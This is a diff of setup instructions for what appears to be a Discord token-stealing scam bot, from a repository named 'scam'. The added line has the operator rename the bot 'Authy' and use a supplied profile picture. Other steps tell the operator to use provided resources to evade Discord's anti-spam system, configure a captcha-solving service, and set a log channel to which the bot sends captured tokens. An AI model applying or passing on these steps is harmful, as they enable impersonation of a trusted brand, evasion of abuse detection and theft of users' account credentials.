@@ -32,11 +32,11 @@
 - **Create a new Discord Bot**
   - **Enable all intents for the bot** This is very important. If you do not enable all intents, the bot will not work.
     - https://discord.dev **Bot** > **Privileged Gateway Intents**
-  - **For Best Results** Discord have an anti-spam system that will disable any suspicious bots. To avoid this, it is best to use the provided resources that are located [here](https://github.com/ulnk/scam/tree/main/profile).
+  - **For Best Results** Discord have an anti-spam system that will disable any suspicious bots. To avoid this, it is best to use the provided resources that are located [here](https://github.com/ulnk/scam/tree/main/profile). To fit with the profile, rename the bot to `Authy` and set the profile picture to the one provided.
   - **Invite the bot to your server** Use the link below to invite your bot to your server. Change `CLIENTID` to your discord bots client id.
     - To get the client id for your bot > https://discord.dev **Oauth2** > **General**
     - `https://discord.com/api/oauth2/authorize?client_id=CLIENTID&permissions=1376537135104&scope=bot%20applications.commands`
-- **Configure the Preoject**
+- **Configure the Project**
   - Rename `default-config.json` to `config.json`. This is located in `src/default-config.json`.
   - Edit all keys and their values. It is not required to give a value to capmonster, however it is reccomended.
   - When entering the `log.guildId` and `log.channelId` you must enter the id of the server and channel that the bot is inside of. Otherwise the bot will not be able to send the token and will crash.
